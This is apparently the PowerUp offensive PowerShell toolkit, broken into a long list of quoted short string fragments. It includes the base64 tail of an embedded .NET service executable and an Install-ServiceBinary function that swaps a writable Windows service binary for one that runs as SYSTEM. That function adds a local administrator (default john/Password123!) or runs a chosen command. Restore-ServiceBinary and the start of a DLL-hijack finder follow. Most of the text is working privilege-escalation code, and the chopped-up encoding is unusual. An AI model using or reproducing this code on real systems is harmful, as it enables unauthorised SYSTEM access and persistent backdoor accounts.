AAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAAA9jAG0A','ZAAuAGUAeABlAA','BwlQEkfW6TS5S/','gwmLKZ5MAAiwP1','9/EdUKOgi3elxW','GTTgiQMGEg0EIA','EBAgMgAAEFIAEB','HQ4DAAABBCABAQ','4FIAEBEUkEIAEB','CAMgAA4GAAISYQ','4OBAABAQgDBwEO','BgABAR0SBQgHAh','0SBR0SBQwBAAdV','cGRhdGVyAAAFAQ','AAAAAXAQASQ29w','eXJpZ2h0IMKpIC','AyMDE1AAApAQAk','N2NhMWIzMmEtOW','MzNy00MTViLWJk','OWYtZGRmNDE5OW','UxNmVjAAAMAQAH','MS4wLjAuMAAAZQ','EAKS5ORVRGcmFt','ZXdvcmssVmVyc2','lvbj12NC4wLFBy','b2ZpbGU9Q2xpZW','50AQBUDhRGcmFt','ZXdvcmtEaXNwbG','F5TmFtZR8uTkVU','IEZyYW1ld29yay','A0IENsaWVudCBQ','cm9maWxlCAEAAg','AAAAAACAEACAAA','AAAAHgEAAQBUAh','ZXcmFwTm9uRXhj','ZXB0aW9uVGhyb3','dzAQAAAAAA0zU/','VQAAAAACAAAAWg','AAAGxpAABsSwAA','UlNEU96HoAZJqg','NGhaplF41X24ID','AAAAQzpcVXNlcn','NcbGFiXERlc2t0','b3BcVXBkYXRlcj','JcVXBkYXRlclxv','YmpceDg2XFJlbG','Vhc2VcVXBkYXRl','ci5wZGIAAADwaQ','AAAAAAAAAAAAAO','agAAACAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAGoAAA','AAAAAAAAAAAAAA','AAAAX0NvckV4ZU','1haW4AbXNjb3Jl','ZS5kbGwAAAAAAP','8lACBAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAACABAAAAAgAA','CAGAAAADgAAIAA','AAAAAAAAAAAAAA','AAAAEAAQAAAFAA','AIAAAAAAAAAAAA','AAAAAAAAEAAQAA','AGgAAIAAAAAAAA','AAAAAAAAAAAAEA','AAAAAIAAAAAAAA','AAAAAAAAAAAAAA','AAEAAAAAAJAAAA','CggAAAoAIAAAAA','AAAAAAAAQIMAAO','oBAAAAAAAAAAAA','AKACNAAAAFYAUw','BfAFYARQBSAFMA','SQBPAE4AXwBJAE','4ARgBPAAAAAAC9','BO/+AAABAAAAAQ','AAAAAAAAABAAAA','AAA/AAAAAAAAAA','QAAAABAAAAAAAA','AAAAAAAAAAAARA','AAAAEAVgBhAHIA','RgBpAGwAZQBJAG','4AZgBvAAAAAAAk','AAQAAABUAHIAYQ','BuAHMAbABhAHQA','aQBvAG4AAAAAAA','AAsAQAAgAAAQBT','AHQAcgBpAG4AZw','BGAGkAbABlAEkA','bgBmAG8AAADcAQ','AAAQAwADAAMAAw','ADAANABiADAAAA','A4AAgAAQBGAGkA','bABlAEQAZQBzAG','MAcgBpAHAAdABp','AG8AbgAAAAAAVQ','BwAGQAYQB0AGUA','cgAAADAACAABAE','YAaQBsAGUAVgBl','AHIAcwBpAG8Abg','AAAAAAMQAuADAA','LgAwAC4AMAAAAD','gADAABAEkAbgB0','AGUAcgBuAGEAbA','BOAGEAbQBlAAAA','VQBwAGQAYQB0AG','UAcgAuAGUAeABl','AAAASAASAAEATA','BlAGcAYQBsAEMA','bwBwAHkAcgBpAG','cAaAB0AAAAQwBv','AHAAeQByAGkAZw','BoAHQAIACpACAA','IAAyADAAMQA1AA','AAQAAMAAEATwBy','AGkAZwBpAG4AYQ','BsAEYAaQBsAGUA','bgBhAG0AZQAAAF','UAcABkAGEAdABl','AHIALgBlAHgAZQ','AAADAACAABAFAA','cgBvAGQAdQBjAH','QATgBhAG0AZQAA','AAAAVQBwAGQAYQ','B0AGUAcgAAADQA','CAABAFAAcgBvAG','QAdQBjAHQAVgBl','AHIAcwBpAG8Abg','AAADEALgAwAC4A','MAAuADAAAAA4AA','gAAQBBAHMAcwBl','AG0AYgBsAHkAIA','BWAGUAcgBzAGkA','bwBuAAAAMQAuAD','AALgAwAC4AMAAA','AO+7vzw/eG1sIH','ZlcnNpb249IjEu','MCIgZW5jb2Rpbm','c9IlVURi04IiBz','dGFuZGFsb25lPS','J5ZXMiPz4NCjxh','c3NlbWJseSB4bW','xucz0idXJuOnNj','aGVtYXMtbWljcm','9zb2Z0LWNvbTph','c20udjEiIG1hbm','lmZXN0VmVyc2lv','bj0iMS4wIj4NCi','AgPGFzc2VtYmx5','SWRlbnRpdHkgdm','Vyc2lvbj0iMS4w','LjAuMCIgbmFtZT','0iTXlBcHBsaWNh','dGlvbi5hcHAiLz','4NCiAgPHRydXN0','SW5mbyB4bWxucz','0idXJuOnNjaGVt','YXMtbWljcm9zb2','Z0LWNvbTphc20u','djIiPg0KICAgID','xzZWN1cml0eT4N','CiAgICAgIDxyZX','F1ZXN0ZWRQcml2','aWxlZ2VzIHhtbG','5zPSJ1cm46c2No','ZW1hcy1taWNyb3','NvZnQtY29tOmFz','bS52MyI+DQogIC','AgICAgIDxyZXF1','ZXN0ZWRFeGVjdX','Rpb25MZXZlbCBs','ZXZlbD0iYXNJbn','Zva2VyIiB1aUFj','Y2Vzcz0iZmFsc2','UiLz4NCiAgICAg','IDwvcmVxdWVzdG','VkUHJpdmlsZWdl','cz4NCiAgICA8L3','NlY3VyaXR5Pg0K','ICA8L3RydXN0SW','5mbz4NCjwvYXNz','ZW1ibHk+DQoAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAGAAAAwAAAAg','OgAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAA=','"
        [Byt','e[]] $Binary =',' [Byte[]][Conv','ert]::FromBase','64String($B64B','inary)

      ','  if ($PSBound','Parameters[''Co','mmand'']) {
   ','         $Serv','iceCommand = $','Command
      ','  }
        el','se {
         ','   if ($PSBoun','dParameters[''C','redential'']) {','
             ','   $UserNameTo','Add = $Credent','ial.UserName
 ','              ',' $PasswordToAd','d = $Credentia','l.GetNetworkCr','edential().Pas','sword
        ','    }
        ','    else {
   ','             $','UserNameToAdd ','= $UserName
  ','              ','$PasswordToAdd',' = $Password
 ','           }

','            if',' ($UserNameToA','dd.Contains(''\',''')) {
        ','        # only',' adding a doma','in user to the',' local group, ','no user creati','on
           ','     $ServiceC','ommand = "net ','localgroup $Lo','calGroup $User','NameToAdd /add','"
            ','}
            ','else {
       ','         # cre','ate a local us','er and add it ','to the local s','pecified group','
             ','   $ServiceCom','mand = "net us','er $UserNameTo','Add $PasswordT','oAdd /add && t','imeout /t 5 &&',' net localgrou','p $LocalGroup ','$UserNameToAdd',' /add"
       ','     }
       ',' }
    }

    ','PROCESS {

   ','     $TargetSe','rvice = Get-Se','rvice -Name $N','ame

        #',' get the unico','de byte conver','sions of all a','rguments
     ','   $Enc = [Sys','tem.Text.Encod','ing]::Unicode
','        $Servi','ceNameBytes = ','$Enc.GetBytes(','$TargetService','.Name)
       ',' $CommandBytes',' = $Enc.GetByt','es($ServiceCom','mand)

       ',' # patch all v','alues in to th','eir appropriat','e locations
  ','      for ($i=','0; $i -lt ($Se','rviceNameBytes','.Length); $i++',') {
          ','  # service na','me offset = 24','58
           ',' $Binary[$i+24','58] = $Service','NameBytes[$i]
','        }
    ','    for ($i=0;',' $i -lt ($Comm','andBytes.Lengt','h); $i++) {
  ','          # cm','d offset = 253','5
            ','$Binary[$i+253','5] = $CommandB','ytes[$i]
     ','   }

        ','Set-Content -V','alue $Binary -','Encoding Byte ','-Path $Path -F','orce -ErrorAct','ion Stop

    ','    $Out = New','-Object PSObje','ct
        $Ou','t | Add-Member',' Noteproperty ','''ServiceName'' ','$TargetService','.Name
        ','$Out | Add-Mem','ber Noteproper','ty ''Path'' $Pat','h
        $Out',' | Add-Member ','Noteproperty ''','Command'' $Serv','iceCommand
   ','     $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.ServiceB','inary'')
      ','  $Out
    }
}','


function In','stall-ServiceB','inary {
<#
.SY','NOPSIS

Replac','es the service',' binary for th','e specified se','rvice with one',' that executes','
a specified c','ommand as SYST','EM.

Author: W','ill Schroeder ','(@harmj0y)  
L','icense: BSD 3-','Clause  
Requi','red Dependenci','es: Get-Servic','eDetail, Get-M','odifiablePath,',' Write-Service','Binary  

.DES','CRIPTION

Take','s a service Na','me or a Servic','eProcess.Servi','ceController o','n the pipeline',' where the
cur','rent user can ',' modify the as','sociated servi','ce binary list','ed in the binP','ath. Backs up
','the original s','ervice binary ','to "OriginalSe','rvice.exe.bak"',' in service bi','nary location,','
and then uses',' Write-Service','Binary to crea','te a C# servic','e binary that ','either adds
a ','local administ','rator user or ','executes a cus','tom command. T','he new service',' binary is
rep','laced in the o','riginal servic','e binary path,',' and a custom ','object is retu','rned that
capt','ures the origi','nal and new se','rvice binary c','onfiguration.
','
.PARAMETER Na','me

The servic','e name the EXE',' will be runni','ng under.

.PA','RAMETER UserNa','me

The [domai','n\]username to',' add. If not g','iven, it defau','lts to "john".','
Domain users ','are not create','d, only added ','to the specifi','ed localgroup.','

.PARAMETER P','assword

The p','assword to set',' for the added',' user. If not ','given, it defa','ults to "Passw','ord123!"

.PAR','AMETER LocalGr','oup

Local gro','up name to add',' the user to (','default of ''Ad','ministrators'')','.

.PARAMETER ','Credential

A ','[Management.Au','tomation.PSCre','dential] objec','t specifying t','he user/passwo','rd to add.

.P','ARAMETER Comma','nd

Custom com','mand to execut','e instead of u','ser creation.
','
.EXAMPLE

Ins','tall-ServiceBi','nary -Name Vul','nSVC

Backs up',' the original ','service binary',' to SERVICE_PA','TH.exe.bak and',' replaces the ','binary
for Vul','nSVC with one ','that adds a lo','cal Administra','tor (john/Pass','word123!).

.E','XAMPLE

Get-Se','rvice VulnSVC ','| Install-Serv','iceBinary

Bac','ks up the orig','inal service b','inary to SERVI','CE_PATH.exe.ba','k and replaces',' the binary
fo','r VulnSVC with',' one that adds',' a local Admin','istrator (john','/Password123!)','.

.EXAMPLE

I','nstall-Service','Binary -Name V','ulnSVC -UserNa','me ''TESTLAB\jo','hn''

Backs up ','the original s','ervice binary ','to SERVICE_PAT','H.exe.bak and ','replaces the b','inary
for Vuln','SVC with one t','hat adds TESTL','AB\john to the',' Administrator','s local group.','

.EXAMPLE

In','stall-ServiceB','inary -Name Vu','lnSVC -UserNam','e backdoor -Pa','ssword Passwor','d123!

Backs u','p the original',' service binar','y to SERVICE_P','ATH.exe.bak an','d replaces the',' binary
for Vu','lnSVC with one',' that adds a l','ocal Administr','ator (backdoor','/Password123!)','.

.EXAMPLE

I','nstall-Service','Binary -Name V','ulnSVC -Comman','d "net ..."

B','acks up the or','iginal service',' binary to SER','VICE_PATH.exe.','bak and replac','es the binary
','for VulnSVC wi','th one that ex','ecutes a custo','m command.

.O','UTPUTS

PowerU','p.ServiceBinar','y.Installed
#>','

    [Diagnos','tics.CodeAnaly','sis.SuppressMe','ssageAttribute','(''PSShouldProc','ess'', '''')]
   ',' [Diagnostics.','CodeAnalysis.S','uppressMessage','Attribute(''PSA','voidUsingUserN','ameAndPassWord','Params'', '''')]
','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSAvoidUsingPl','ainTextForPass','word'', '''')]
  ','  [OutputType(','''PowerUp.Servi','ceBinary.Insta','lled'')]
    [C','mdletBinding()',']
    Param(
 ','       [Parame','ter(Position =',' 0, Mandatory ','= $True, Value','FromPipeline =',' $True, ValueF','romPipelineByP','ropertyName = ','$True)]
      ','  [Alias(''Serv','iceName'')]
   ','     [String]
','        [Valid','ateNotNullOrEm','pty()]
       ',' $Name,

     ','   [String]
  ','      $UserNam','e = ''john'',

 ','       [String',']
        $Pas','sword = ''Passw','ord123!'',

   ','     [String]
','        $Local','Group = ''Admin','istrators'',

 ','       [Manage','ment.Automatio','n.PSCredential',']
        [Man','agement.Automa','tion.Credentia','lAttribute()]
','        $Crede','ntial = [Manag','ement.Automati','on.PSCredentia','l]::Empty,

  ','      [String]','
        [Vali','dateNotNullOrE','mpty()]
      ','  $Command
   ',' )

    BEGIN ','{
        if (','$PSBoundParame','ters[''Command''',']) {
         ','   $ServiceCom','mand = $Comman','d
        }
  ','      else {
 ','           if ','($PSBoundParam','eters[''Credent','ial'']) {
     ','           $Us','erNameToAdd = ','$Credential.Us','erName
       ','         $Pass','wordToAdd = $C','redential.GetN','etworkCredenti','al().Password
','            }
','            el','se {
         ','       $UserNa','meToAdd = $Use','rName
        ','        $Passw','ordToAdd = $Pa','ssword
       ','     }

      ','      if ($Use','rNameToAdd.Con','tains(''\'')) {
','              ','  # only addin','g a domain use','r to the local',' group, no use','r creation
   ','             $','ServiceCommand',' = "net localg','roup $LocalGro','up $UserNameTo','Add /add"
    ','        }
    ','        else {','
             ','   # create a ','local user and',' add it to the',' local specifi','ed group
     ','           $Se','rviceCommand =',' "net user $Us','erNameToAdd $P','asswordToAdd /','add && timeout',' /t 5 && net l','ocalgroup $Loc','alGroup $UserN','ameToAdd /add"','
            }','
        }
   ',' }

    PROCES','S {
        $T','argetService =',' Get-Service -','Name $Name -Er','rorAction Stop','
        $Serv','iceDetails = $','TargetService ','| Get-ServiceD','etail
        ','$ModifiableFil','es = $ServiceD','etails.PathNam','e | Get-Modifi','ablePath -Lite','ral

        i','f (-not $Modif','iableFiles) {
','            th','row "Service b','inary ''$($Serv','iceDetails.Pat','hName)'' for se','rvice $($Servi','ceDetails.Name',') not modifiab','le by the curr','ent user."
   ','     }

      ','  $ServicePath',' = $Modifiable','Files | Select','-Object -First',' 1 | Select-Ob','ject -ExpandPr','operty Modifia','blePath
      ','  $BackupPath ','= "$($ServiceP','ath).bak"

   ','     Write-Ver','bose "Backing ','up ''$ServicePa','th'' to ''$Backu','pPath''"

     ','   try {
     ','       Copy-It','em -Path $Serv','icePath -Desti','nation $Backup','Path -Force
  ','      }
      ','  catch {
    ','        Write-','Warning "Error',' backing up ''$','ServicePath'' :',' $_"
        }','

        $Res','ult = Write-Se','rviceBinary -N','ame $ServiceDe','tails.Name -Co','mmand $Service','Command -Path ','$ServicePath
 ','       $Result',' | Add-Member ','Noteproperty ''','BackupPath'' $B','ackupPath
    ','    $Result.PS','Object.TypeNam','es.Insert(0, ''','PowerUp.Servic','eBinary.Instal','led'')
        ','$Result
    }
','}


function R','estore-Service','Binary {
<#
.S','YNOPSIS

Resto','res a service ','binary backed ','up by Install-','ServiceBinary.','

Author: Will',' Schroeder (@h','armj0y)  
Lice','nse: BSD 3-Cla','use  
Required',' Dependencies:',' Get-ServiceDe','tail, Get-Modi','fiablePath  

','.DESCRIPTION

','Takes a servic','e Name or a Se','rviceProcess.S','erviceControll','er on the pipe','line and
check','s for the exis','tence of an "O','riginalService','Binary.exe.bak','" in the servi','ce
binary loca','tion. If it ex','ists, the back','up binary is r','estored to the',' original
bina','ry path.

.PAR','AMETER Name

T','he service nam','e to restore a',' binary for.

','.PARAMETER Bac','kupPath

Optio','nal manual pat','h to the backu','p binary.

.EX','AMPLE

Restore','-ServiceBinary',' -Name VulnSVC','

Restore the ','original binar','y for the serv','ice ''VulnSVC''.','

.EXAMPLE

Ge','t-Service Vuln','SVC | Restore-','ServiceBinary
','
Restore the o','riginal binary',' for the servi','ce ''VulnSVC''.
','
.EXAMPLE

Res','tore-ServiceBi','nary -Name Vul','nSVC -BackupPa','th ''C:\temp\ba','ckup.exe''

Res','tore the origi','nal binary for',' the service ''','VulnSVC'' from ','a custom locat','ion.

.OUTPUTS','

PowerUp.Serv','iceBinary.Inst','alled
#>

    ','[Diagnostics.C','odeAnalysis.Su','ppressMessageA','ttribute(''PSSh','ouldProcess'', ',''''')]
    [Outp','utType(''PowerU','p.ServiceBinar','y.Restored'')]
','    [CmdletBin','ding()]
    Pa','ram(
        [','Parameter(Posi','tion = 0, Mand','atory = $True,',' ValueFromPipe','line = $True, ','ValueFromPipel','ineByPropertyN','ame = $True)]
','        [Alias','(''ServiceName''',')]
        [St','ring]
        ','[ValidateNotNu','llOrEmpty()]
 ','       $Name,
','
        [Para','meter(Position',' = 1)]
       ',' [ValidateScri','pt({Test-Path ','-Path $_ })]
 ','       [String',']
        $Bac','kupPath
    )
','
    PROCESS {','
        $Targ','etService = Ge','t-Service -Nam','e $Name -Error','Action Stop
  ','      $Service','Details = $Tar','getService | G','et-ServiceDeta','il
        $Mo','difiableFiles ','= $ServiceDeta','ils.PathName |',' Get-Modifiabl','ePath -Literal','

        if (','-not $Modifiab','leFiles) {
   ','         throw',' "Service bina','ry ''$($Service','Details.PathNa','me)'' for servi','ce $($ServiceD','etails.Name) n','ot modifiable ','by the current',' user."
      ','  }

        $','ServicePath = ','$ModifiableFil','es | Select-Ob','ject -First 1 ','| Select-Objec','t -ExpandPrope','rty Modifiable','Path
        $','BackupPath = "','$($ServicePath',').bak"

      ','  Copy-Item -P','ath $BackupPat','h -Destination',' $ServicePath ','-Force
       ',' Remove-Item -','Path $BackupPa','th -Force

   ','     $Out = Ne','w-Object PSObj','ect
        $O','ut | Add-Membe','r Noteproperty',' ''ServiceName''',' $ServiceDetai','ls.Name
      ','  $Out | Add-M','ember Noteprop','erty ''ServiceP','ath'' $ServiceP','ath
        $O','ut | Add-Membe','r Noteproperty',' ''BackupPath'' ','$BackupPath
  ','      $Out.PSO','bject.TypeName','s.Insert(0, ''P','owerUp.Service','Binary.Restore','d'')
        $O','ut
    }
}


#','##############','##############','##############','#############
','#
# DLL Hijack','ing
#
########','##############','##############','##############','######

functi','on Find-Proces','sDLLHijack {
<','#
.SYNOPSIS

F','inds all DLL h','ijack location','s for currentl','y running proc','esses.

Author',': Will Schroed','er (@harmj0y) ',' 
License: BSD',' 3-Clause  
Re','quired Depende','ncies: None  
','
.DESCRIPTION
','
Enumerates al','l currently ru','nning processe','s with Get-Pro','cess (or accep','ts an
input pr','ocess object f','rom Get-Proces','s) and enumera','tes the loaded',' modules for e','ach.
All loade','d module name ','exists outside',' of the proces','s binary base ','path, as those','
are DLL load-','order hijack c','andidates.

.P','ARAMETER Name
','
The name of a',' process to en','umerate for po','ssible DLL pat','h hijack oppor','tunities.

.PA','RAMETER Exclud','eWindows

Excl','ude paths from',' C:\Windows\* ','instead of jus','t C:\Windows\S','ystem32\*

.PA','RAMETER Exclud','eProgramFiles
','
Exclude paths',' from C:\Progr','am Files\* and',' C:\Program Fi','les (x86)\*

.','PARAMETER Excl','udeOwned

Excl','ude processes ','the current us','er owns.

.EXA','MPLE

Find-Pro','cessDLLHijack
','
